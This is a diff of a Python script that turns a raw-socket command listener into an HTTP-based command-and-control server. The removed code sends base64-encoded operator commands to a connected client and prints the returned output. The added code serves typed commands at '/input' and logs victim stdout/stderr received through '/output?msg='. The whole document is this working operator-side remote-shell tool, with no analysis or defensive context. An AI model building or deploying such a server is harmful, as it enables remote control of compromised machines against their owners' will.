@@ -1,28 +1,32 @@
-import socket
-import base64
-from charset_normalizer import detect
+import http.server
+import socketserver
+import urllib.parse
 
-HOST = '127.0.0.1'
-PORT = 8080
+PORT = 8000
 
-with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.bind((HOST, PORT))
-    s.listen()
-    print(f"Server listening on {HOST}:{PORT}")
-    conn, addr = s.accept()
-    with conn:
-        print('Got Client: ', addr)
-        while True:
-            while(True):
-                cmd = input("> ")
-                if cmd == "":
-                    print("Can't be empty.")
-                    continue
-                break
-            b_cmd = base64.encodebytes(cmd.encode("ascii"))
-            conn.send(b_cmd)
+Handler = http.server.SimpleHTTPRequestHandler
 
-            data = conn.recv(1024)
-            std_all = base64.decodebytes(data)
-            encDetector = detect(std_all)
-            print(std_all.decode(encDetector["encoding"]).encode("utf-8").decode("utf-8"))
+class CustomHandler(http.server.SimpleHTTPRequestHandler):
+    def do_GET(self):
+        print(self.path)
+        if "/output" in self.path:
+            self.output_std_out_err()
+        if "/input" in self.path:
+            self.send_cmd()
+
+    def output_std_out_err(self):
+        parsed = urllib.parse.urlparse(self.path)
+        qs = urllib.parse.parse_qs(parsed.query)
+        msg = qs.get("msg", [""])[0]
+        print(f"{self.client_address}: {msg}")
+
+    def send_cmd(self):
+        cmd = input("Your command: ")
+
+        self.send_response(200)
+        self.send_header('Content-type', 'text/plain')
+        self.end_headers()
+        self.wfile.write(cmd.encode("utf-8"))
+with socketserver.TCPServer(("", PORT), CustomHandler) as httpd:
+    print(f"Serving at port {PORT}")
+    httpd.serve_forever()
